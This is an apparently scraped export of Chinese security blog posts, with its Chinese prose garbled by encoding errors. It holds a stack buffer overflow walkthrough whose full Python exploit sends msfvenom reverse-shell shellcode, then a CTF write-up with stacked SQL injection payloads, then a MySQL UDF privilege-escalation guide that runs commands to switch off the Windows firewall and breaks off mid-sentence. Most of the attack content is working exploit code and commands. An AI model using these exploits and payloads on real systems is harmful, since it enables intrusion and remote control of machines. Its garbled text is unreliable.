æ¨¡ç³Šæµ‹è¯•(Fuzzing)æµ‹è¯•æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºé—®é¢˜ æ¨¡ç³Šæµ‹è¯•pyè„šæœ¬å¦‚ä¸‹ï¼š #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 100 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz) s.recv(1024) print \"Send str length: \" + str(fuzz) fuzz += 150 except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() è¿›è¡Œæ¨¡ç³Šæµ‹è¯• æœåŠ¡å´©æºƒï¼ŒEIPä¸ºå‘é€çš„A è¯´æ˜è¯¥æœåŠ¡TRUNå‘½ä»¤å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ æŸ¥æ‰¾åç§»é‡ï¼ˆFinding the offsetï¼‰ ä½¿ç”¨Metasploitçš„pattern_createå·¥å…·åˆ›å»ºä¸€ä¸ª500å¤§å°çš„å­—ç¬¦ä¸² æŸ¥æ‰¾åç§»é‡pyè„šæœ¬å¦‚ä¸‹ï¼š #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2000 payload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\" while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + payload) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() é‡å¯æœåŠ¡Ctrl+2-&gt;F9ï¼Œå¼€å§‹æŸ¥æ‰¾åç§»é‡æµ‹è¯• EIPå¯„å­˜å™¨çš„å€¼æ˜¯0x41316141 ä½¿ç”¨Metasploitå·¥å…·pattern_offsetæ¥ç¡®å®šå­—èŠ‚æ•° ./pattern_offset.rb -l 500 -q 41316141 # -qå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„åœ°å€ï¼Œ-lå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„å­—ç¬¦åºåˆ—çš„é•¿åº¦ # ä¸Šå›¾ä¸­æˆ‘ä»¬å¾—å‡ºçš„åœ°å€æ˜¯ 0x61413161, è€Œç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º500ï¼Œ å› æ­¤è¿™é‡Œä½¿ç”¨ -l 500 -q 61413161 è®¡ç®—ç»“æœä¸º3, ä¹Ÿå°±æ˜¯è¯´è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨[2003-2007] è¿™å››ä¸ªå­—èŠ‚ éªŒè¯åç§»é‡åœ°å€ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + 'B'*4 + 'C'*1000) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() ç¨‹åºå´©æºƒåEIPä¸º4ä¸ªBï¼Œè¯´æ˜ç›®å‰æˆ‘ä»¬å·²ç»å¯ä»¥ç²¾ç¡®è¦†ç›–EIPäº† è¦†ç›–EIP è®©EIPé‡å†™ä¸ºJMP ESPï¼Œä»¥ä¾¿æŠŠç¨‹åºæ§åˆ¶åŠ«æŒåˆ°ESPå¤„ï¼Œä»è€Œèƒ½å¤Ÿè¿è¡Œæˆ‘ä»¬çš„shellcodeã€‚ ä½¿ç”¨Metasploitçš„nasm_shellå·¥å…·æŸ¥è¯¢JMP ESPçš„åå…­è¿›åˆ¶å€¼ å¯»æ‰¾å¯åˆ©ç”¨çš„è·³æ¿åœ¨Immunity Debuggerä¸­ä½¿ç”¨monaè„šæœ¬æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„æŒ‡ä»¤è·³æ¿ æ–¹æ³•ä¸€ï¼š!mona modules //æ‰¾åˆ°SEHã€ADLRç­‰å‡ä¸ºfalseçš„dllï¼Œä½œä¸ºæŒ‡ä»¤è·³æ¿ï¼Œæ­¤ä¾‹ä¸­ä¸ºessfunc.dll !mona find -s &quot;\\xff\\xe4&quot; -m essfunc.dll // æ‰¾åˆ°essfunc.dllçš„JMP ESPæŒ‡ä»¤ä½ç½®ï¼Œå³åœ°å€[625011af] æ–¹æ³•äºŒï¼š!mona jmp -r esp // æ•ˆæœåŒä¸Šï¼Œç›´æ¥æ‰¾åˆ°essfunc.dllçš„JMP ESPæŒ‡ä»¤åœ°å€ï¼ŒåŒæ ·ä¸º[625011af] å°†shellcodeä¸­è¦å‡†å¤‡è¦†ç›–EIPçš„ä½ç½®ä¿®æ”¹ä¸º&#39;\\xaf\\x11\\x50\\x62&#39; #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xaf\\x11\\x50\\x62' + 'C'*1000) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡ŒESPæŒ‡å‘çš„æ˜¯æˆ‘ä»¬åœ¨EIPåé¢ç»™çš„1000ä¸ªC, ç°åœ¨æˆ‘ä»¬æ˜¯è¦å°†Cæ›¿æ¢æˆæˆ‘ä»¬å¸Œæœ›è¿è¡Œçš„Shellcodeã€‚ æŸ¥æ‰¾åå­—èŠ‚æŸ¥æ‰¾åå­—ç¬¦æ€è·¯ï¼š å‘é€(0x00â€“0xff)256ä¸ªå­—ç¬¦ï¼ŒæŸ¥æ‰¾æ‰€æœ‰åå­—ç¬¦ #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 badchars = ( \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\" \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\" \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\" \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\" \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\" \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\" \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\" \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\" \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\" \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\" \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\" \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\" \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\" \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\" \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\" \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\\x00\" ) while True: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xbb\\x11\\x50\\x62' + badchars) s.recv(1024) print \"Send str length: \" + str(fuzz) except Exception,err: print \"End...,Send str length: \" + str(fuzz) sys.exit() finally: s.close() å¯ä»¥çœ‹åˆ°æ‰€æœ‰å­—èŠ‚éƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œè¡¨ç¤ºæ²¡æœ‰éœ€è¦è¿‡æ»¤çš„åå­—èŠ‚ã€‚è¯´æ˜é™¤äº†â€\\x00â€ä»¥å¤–çš„å­—ç¬¦éƒ½å¯ä½¿ç”¨ã€‚ ç”Ÿæˆshellcodeåˆ©ç”¨msfç”Ÿæˆshellcode msfvenom -p windows/shell_reverse_tcp LHOST=10.7.5.150 LPORT=1234 EXITFUNC=thread -f python -b \"\\x00\\x0a\\x0d\" -a x86 # -b \"\\x00\\x0a\\x0d\" å»æ‰åå­—ç¬¦ expå¦‚ä¸‹ï¼š #!/usr/bin/env python import sys import socket host = sys.argv[1] port = int(sys.argv[2]) fuzz = 2003 buf = b\"\" buf += b\"\\xbd\\xbd\\x7a\\xc7\\xf1\\xd9\\xc3\\xd9\\x74\\x24\\xf4\\x58\\x2b\" buf += b\"\\xc9\\xb1\\x52\\x31\\x68\\x12\\x83\\xc0\\x04\\x03\\xd5\\x74\\x25\" buf += b\"\\x04\\xd9\\x61\\x2b\\xe7\\x21\\x72\\x4c\\x61\\xc4\\x43\\x4c\\x15\" buf += b\"\\x8d\\xf4\\x7c\\x5d\\xc3\\xf8\\xf7\\x33\\xf7\\x8b\\x7a\\x9c\\xf8\" buf += b\"\\x3c\\x30\\xfa\\x37\\xbc\\x69\\x3e\\x56\\x3e\\x70\\x13\\xb8\\x7f\" buf += b\"\\xbb\\x66\\xb9\\xb8\\xa6\\x8b\\xeb\\x11\\xac\\x3e\\x1b\\x15\\xf8\" buf += b\"\\x82\\x90\\x65\\xec\\x82\\x45\\x3d\\x0f\\xa2\\xd8\\x35\\x56\\x64\" buf += b\"\\xdb\\x9a\\xe2\\x2d\\xc3\\xff\\xcf\\xe4\\x78\\xcb\\xa4\\xf6\\xa8\" buf += b\"\\x05\\x44\\x54\\x95\\xa9\\xb7\\xa4\\xd2\\x0e\\x28\\xd3\\x2a\\x6d\" buf += b\"\\xd5\\xe4\\xe9\\x0f\\x01\\x60\\xe9\\xa8\\xc2\\xd2\\xd5\\x49\\x06\" buf += b\"\\x84\\x9e\\x46\\xe3\\xc2\\xf8\\x4a\\xf2\\x07\\x73\\x76\\x7f\\xa6\" buf += b\"\\x53\\xfe\\x3b\\x8d\\x77\\x5a\\x9f\\xac\\x2e\\x06\\x4e\\xd0\\x30\" buf += b\"\\xe9\\x2f\\x74\\x3b\\x04\\x3b\\x05\\x66\\x41\\x88\\x24\\x98\\x91\" buf += b\"\\x86\\x3f\\xeb\\xa3\\x09\\x94\\x63\\x88\\xc2\\x32\\x74\\xef\\xf8\" buf += b\"\\x83\\xea\\x0e\\x03\\xf4\\x23\\xd5\\x57\\xa4\\x5b\\xfc\\xd7\\x2f\" buf += b\"\\x9b\\x01\\x02\\xff\\xcb\\xad\\xfd\\x40\\xbb\\x0d\\xae\\x28\\xd1\" buf += b\"\\x81\\x91\\x49\\xda\\x4b\\xba\\xe0\\x21\\x1c\\xcf\\xf3\\x2c\\x50\" buf += b\"\\xa7\\xf9\\x2e\\x79\\x58\\x77\\xc8\\x13\\x88\\xd1\\x43\\x8c\\x31\" buf += b\"\\x78\\x1f\\x2d\\xbd\\x56\\x5a\\x6d\\x35\\x55\\x9b\\x20\\xbe\\x10\" buf += b\"\\x8f\\xd5\\x4e\\x6f\\xed\\x70\\x50\\x45\\x99\\x1f\\xc3\\x02\\x59\" buf += b\"\\x69\\xf8\\x9c\\x0e\\x3e\\xce\\xd4\\xda\\xd2\\x69\\x4f\\xf8\\x2e\" buf += b\"\\xef\\xa8\\xb8\\xf4\\xcc\\x37\\x41\\x78\\x68\\x1c\\x51\\x44\\x71\" buf += b\"\\x18\\x05\\x18\\x24\\xf6\\xf3\\xde\\x9e\\xb8\\xad\\x88\\x4d\\x13\" buf += b\"\\x39\\x4c\\xbe\\xa4\\x3f\\x51\\xeb\\x52\\xdf\\xe0\\x42\\x23\\xe0\" buf += b\"\\xcd\\x02\\xa3\\x99\\x33\\xb3\\x4c\\x70\\xf0\\xd3\\xae\\x50\\x0d\" buf += b\"\\x7c\\x77\\x31\\xac\\xe1\\x88\\xec\\xf3\\x1f\\x0b\\x04\\x8c\\xdb\" buf += b\"\\x13\\x6d\\x89\\xa0\\x93\\x9e\\xe3\\xb9\\x71\\xa0\\x50\\xb9\\x53\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.settimeout(2) s.send(\"TRUN /:./\" + 'A'*fuzz + '\\xbb\\x11\\x50\\x62' + '\\x90'*50 + buf) s.recv(1024) print \"Send str length: \" + str(fuzz) æœ¬åœ°å¯¹4448ç«¯å£è¿›è¡Œç›‘å¬ æ‰§è¡Œexp ncæˆåŠŸè·å¾—åå¼¹shellï¼Œåˆ°æ­¤å³æˆåŠŸå¾—åˆ°äº¤äº’shellã€‚","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ç¼“å†²åŒºæº¢å‡º","slug":"ç¼“å†²åŒºæº¢å‡º","permalink":"https://ms12020.github.io/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"}]},{"title":"2019å¼ºç½‘æ¯ éšä¾¿æ³¨","slug":"[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨","date":"2021-04-25T06:29:54.585Z","updated":"2021-04-25T06:31:54.450Z","comments":true,"path":"2021/04/25/[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨/","link":"","permalink":"https://ms12020.github.io/2021/04/25/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"","text":"[2019 å¼ºç½‘æ¯]éšä¾¿æ³¨è®¿é—®é¢˜ç›®ç«™ç‚¹ï¼Œéšä¾¿è¾“å…¥å°±èƒ½çœ‹åˆ°è¿”å›ç»“æœ è¾“å…¥&#39;æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ å‘ç°æŠ¥é”™ï¼Œå¯ä»¥çŒœæµ‹æ­¤æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ æ„é€ SQLè¯­å¥è¿”å›èƒ½æŸ¥çœ‹çš„æ‰€æœ‰å€¼ 1' or 1=1# çˆ†å‡ºæ‰€åœ¨è¡¨å­—æ®µæ•° 1' order by 2# //æ­£å¸¸å›æ˜¾ 1' order by 3# //å‡ºç°æŠ¥é”™ è¯æ˜æœ‰2ä¸ªå­—æ®µ å°è¯•çˆ†æ‰€åœ¨æ•°æ®åº“ 1' union select database(),user()# è¿”å›äº†ä¸€ä¸²ä»£ç ï¼Œè¯´æ˜selectå‡½æ•°è¢«è¿‡æ»¤ é‚£ä¹ˆselect unionæŸ¥è¯¢å°±æ— æ³•ä½¿ç”¨äº† å †æ ˆæ³¨å…¥å †å æ³¨å…¥(å †å æŸ¥è¯¢ï¼ŒStacked Queries) å †å æ³¨å…¥ä¸ºæ”»å‡»è€…æä¾›äº†å¾ˆå¤šæ§åˆ¶æƒï¼Œä¸ä»…é™äºSELECTè¯­å¥çš„UNIONè”åˆæŸ¥è¯¢æ”»å‡»ä¸åŒï¼Œå †å æ³¨å…¥å¯ä»¥ç”¨äºæ‰§è¡Œä»»ä½•SQLè¯­å¥ã€‚ å †å æ³¨å…¥åŸç†åœ¨SQLä¸­ï¼Œåˆ†å·è¡¨ç¤ºä¸€æ¡è¯­å¥çš„ç»“æŸã€‚å¦‚æœåœ¨åˆ†å·çš„åé¢å†åŠ ä¸€æ¡è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œç»§ç»­åŠ ä¸€ä¸ªåˆ†å·å’Œä¸€æ¡è¯­å¥ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸€æ¬¡æ•°æ®åº“çš„è°ƒç”¨ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ã€‚ å †å æ³¨å…¥çš„å±€é™æ€§å †å æ³¨å…¥å¹¶ä¸æ˜¯åœ¨æ¯ç§æƒ…å†µä¸‹éƒ½èƒ½ä½¿ç”¨çš„ã€‚å¤§å¤šæ•°æ—¶å€™ï¼Œå› ä¸ºAPIæˆ–æ•°æ®åº“å¼•æ“çš„ä¸æ”¯æŒï¼Œå †å æ³¨å…¥éƒ½æ— æ³•å®ç°ã€‚ æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ -1';show databases;# æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ 1';show tables;# æŸ¥çœ‹è¡¨ç»“æ„ -1';desc `1919810931114514`;desc `words`# åœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦ å‘ç°flagåœ¨1919810931114514è¡¨é‡Œ åˆ¤æ–­å‡ºæŸ¥è¯¢è¯­å¥ selsect id,data from words where id = ? payload0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# ç”±äºå¯ä»¥å †å æŸ¥è¯¢ï¼Œè¿™æ—¶å€™å°±æƒ³åˆ°äº†ä¸€ä¸ªæ”¹åçš„æ–¹æ³• æŠŠwordséšä¾¿æ”¹æˆwords1ï¼Œç„¶åæŠŠ1919810931114514æ”¹æˆwordsï¼Œå†æŠŠåˆ—åflagæ”¹æˆidï¼Œç»“åˆä¸Šé¢çš„1â€™ or 1=1#çˆ†å‡ºè¡¨æ‰€æœ‰å†…å®¹å°±å¯ä»¥æŸ¥flagå•¦ 1&#39;or 1=1#çˆ†å‡ºè¡¨æ‰€æœ‰å†…å®¹ é¢„å¤„ç†è¯­å¥PREPARE name from '[mysql sequece]'; //é¢„å®šä¹‰SQLè¯­å¥ EXECUTE name; //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥ (DEALLOCATE || DROP) PREPARE name; //åˆ é™¤é¢„å®šä¹‰SQL è¯­å¥ é¢„å®šä¹‰è¯­å¥ä¹Ÿå¯ä»¥é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’ SET @tn = 'hahaha'; //å­˜å‚¨è¡¨å SET @sql = concat('select * from ', @tn); //å­˜å‚¨SQLè¯­å¥ PREPARE name from @sql; //é¢„å®šä¹‰SQLè¯­å¥ EXECUTE name; //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥ (DEALLOCATE || DROP) PREPARE sqla; //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ payloadåˆ©ç”¨ char() å‡½æ•°å°†selectçš„ASCIIç è½¬æ¢ä¸ºselectå­—ç¬¦ä¸²ï¼Œæ¥ç€åˆ©ç”¨concat()å‡½æ•°è¿›è¡Œæ‹¼æ¥å¾—åˆ°selectæŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚æˆ–è€…ç›´æ¥ç”¨concat()å‡½æ•°æ‹¼æ¥selectæ¥ç»•è¿‡ã€‚ ä¸ä½¿ç”¨å˜é‡ 1';PREPARE hacker from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE hacker;# ä½¿ç”¨å˜é‡ 1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;# åªæ˜¯ç”¨contact(),ä¸ä½¿ç”¨char() 1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;# å‚è€ƒæ–‡æ¡£MySQLä¸­concatå‡½æ•° Mysqlä¿®æ”¹å­—æ®µåã€ä¿®æ”¹å­—æ®µç±»å‹","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"}]},{"title":"MySQLææƒ","slug":"MySQLææƒ","date":"2021-04-11T06:26:42.924Z","updated":"2021-04-11T06:33:00.826Z","comments":true,"path":"2021/04/11/MySQLææƒ/","link":"","permalink":"https://ms12020.github.io/2021/04/11/MySQL%E6%8F%90%E6%9D%83/","excerpt":"","text":"MySQLææƒ æµç¨‹ï¼šæœåŠ¡æ¢é’ˆâ€”â€”ä¿¡æ¯æ”¶é›†â€”â€”ææƒåˆ©ç”¨â€”â€”è·å–æƒé™ ææƒå‰æï¼šè·å–æ•°æ®åº“æœ€é«˜ç®¡ç†å‘˜çš„è´¦æˆ·å¯†ç  è¯»å–ç½‘ç«™æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼ˆäº†è§£å…¶å‘½åè§„åˆ™åŠæŸ¥æ‰¾æŠ€å·§ï¼‰ sqlã€dataã€incã€configã€connã€databaseã€commonã€include è¯»å–æ•°æ®åº“å­˜å‚¨æˆ–å¤‡ä»½æ–‡ä»¶ï¼ˆäº†è§£æ•°æ®åº“å­˜å‚¨æ ¼å¼åŠå¯¹åº”å†…å®¹ï¼‰ @@basedir/data/æ•°æ®åº“å/è¡¨å.MYD (è¡¨å†…å®¹) æš´åŠ›ç ´è§£ï¼ˆäº†è§£æ•°æ®åº“æ˜¯å¦æ”¯æŒå¤–è”åŠå¦‚ä½•å¼€å¯å¤–è”ï¼‰ UDFææƒåˆ©ç”¨rootæƒé™ï¼Œåˆ›å»ºå¸¦æœ‰è°ƒç”¨cmdå‡½æ•°çš„udf.dll(åŠ¨æ€é“¾æ¥åº“)ã€‚å½“æˆ‘ä»¬æŠŠudf.dllå¯¼å‡ºæŒ‡å®šæ–‡ä»¶å¤¹å¼•å…¥MySQLæ—¶ï¼Œå…¶ä¸­çš„è°ƒç”¨å‡½æ•°æ‹¿å‡ºæ¥å½“ä½œMySQLçš„å‡½æ•°ä½¿ç”¨ã€‚è¿™æ ·æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°æ‰è¢«å½“ä½œæœ¬æœºå‡½æ•°æ‰§è¡Œã€‚åœ¨ä½¿ç”¨CREAT FUNCITONè°ƒç”¨dllä¸­çš„å‡½æ•°åï¼ŒMySQLè´¦å·è½¬åŒ–ä¸ºsystemæƒé™ï¼Œä»è€Œæ¥ææƒã€‚ MySQL &lt; 5.1 udf.dllæ–‡ä»¶åœ¨Windows2003ä¸‹æ”¾ç½®äºc:\\windows\\system32ï¼Œåœ¨windows2000ä¸‹æ”¾ç½®äºc:\\winnt\\system32ã€‚ MySQL =&gt; 5.1 udf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®äºMYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ã€‚ æŸ¥çœ‹æ•°æ®åº“æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ select @@version; select version(); æŸ¥çœ‹æ•°æ®åº“å®‰è£…ç›®å½• select @@basedir; select basedir(); æŸ¥çœ‹MySQLå®‰è£…è·¯å¾„ show variables like '%plugins%'; åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½• select 'x' into dumpfile 'å®‰è£…ç›®å½•\\\\lib::$INDEX_ALLOCATION'; åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½• select 'x' into dumpfile 'å®‰è£…ç›®å½•\\\\lib\\\\plugin::$INDEX_ALLOCATION'; UDFææƒæ–‡ä»¶æ‰€åœ¨ä½ç½® msfçš„UDFæ–‡ä»¶åŸC++å‡½æ•°æ²¡æœ‰å†™å¼‚å¸¸å¤„ç†ï¼Œé‚£ä¹ˆMySQLåŠ è½½çš„æ—¶å€™ä¼šä½¿MySQLå‡ºé”™å¯¼è‡´æ–­å¼€è¿æ¥ã€‚ metasploitä¸‹çš„åŠ¨æ€é“¾æ¥åº“ sqlmapä¸‹çš„åŠ¨æ€é“¾æ¥åº“ sqlmapä¸‹çš„4ä¸ªUDFæ–‡ä»¶æ˜¯ç»è¿‡ç¼–ç çš„ï¼Œå¦‚æœç›´æ¥ä¸¢åœ¨MySQLçš„pluginç›®å½•ä¸‹æ˜¯æ— æ³•åŠ è½½çš„ï¼Œéœ€è¦ç”¨sqlmap/extra/cloak/cloak.pyè¿›è¡Œè§£ç  python .\\cloak.py -d -i ..\\..\\data\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll å¯¼å‡ºdllåˆ°æŒ‡å®šç›®å½• å¯ä»¥ä½¿ç”¨msfä¸­mysql_udf_payloadæ¨¡å— æ¡ä»¶ï¼š secure_auth=YES (è¿è¡Œå¯¼å‡ºæ–‡ä»¶) secure_file_prive=ç©º (å¯ä»¥å¯¼å‡ºä»»æ„æ–‡ä»¶åˆ°ä»»æ„ä½ç½®) æŸ¥çœ‹æ˜¯å¦å…è®¸æ–‡ä»¶å¯¼å‡ºå¯¼å…¥ show variables like \"%secure%\"; å¯¼å‡ºdll select 'lib_mysqludf_sys.dll' into outfile 'å®‰è£…ç›®å½•/lib/pulgin/udf.dll'; åˆ›å»ºcmdshell å‡½æ•° (è¯¥å‡½æ•°å«ä»€ä¹ˆåå­—åœ¨åç»­ä¸­åˆ™ä½¿ç”¨è¯¥å‡½æ•°è¿›è¡ŒæŸ¥è¯¢) create function cmdshell returns string soname 'udf.dll'; # [AGGREATE]æ˜¯èšé›†å‡½æ•°çš„è¡¨ç¤ºï¼Œç³»ç»Ÿå®šä¹‰çš„èšé›†å‡½æ•°æ¯”å¦‚æœ‰COUNT()ã€AVE()ã€MN()ã€MAX()ã€SUM() # SONAME 'file'è¡¨ç¤ºè¿™ä¸ªå‡½æ•°ä»å“ªä¸ªæ–‡ä»¶é‡Œé¢å¼•å…¥ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼Œwindowsä¸‹æ˜¯dllï¼Œlinuxæ˜¯soï¼Œå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶è¦åœ¨mysqlçš„pluginç›®å½•ä¸‹ æ‰§è¡Œå‘½ä»¤ select cmdshell('whoami'); # å…³é—­windowsé˜²ç«å¢™å’Œç­›é€‰ select cmdshell('net stop policyagent'); select cmdshell('net stop sharedaccess'); select cmdshell('netsh advfirewall set allprofiles state off'); udf.dllä¸‹å¸¸è§å‡½æ•° cmdshell //æ‰§è¡Œcmd; downloader //ä¸‹è½½è€…,åˆ°ç½‘ä¸Šä¸‹è½½æŒ‡å®šæ–‡ä»¶å¹¶ä¿å­˜åˆ°æŒ‡å®šç›®å½•; open3389 //é€šç”¨å¼€3389ç»ˆç«¯æœåŠ¡,å¯æŒ‡å®šç«¯å£(ä¸æ”¹ç«¯å£æ— éœ€é‡å¯); backshell //åå¼¹Shell; ProcessView //æšä¸¾ç³»ç»Ÿè¿›ç¨‹; KillProcess //ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹; regread //è¯»æ³¨å†Œè¡¨; regwrite //å†™æ³¨å†Œè¡¨; shut //å…³æœº,æ³¨é”€,é‡å¯; about //è¯´æ˜ä¸å¸®åŠ©å‡½æ•°; MOFææƒMOFæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšæ‰˜ç®¡å¯¹è±¡æ 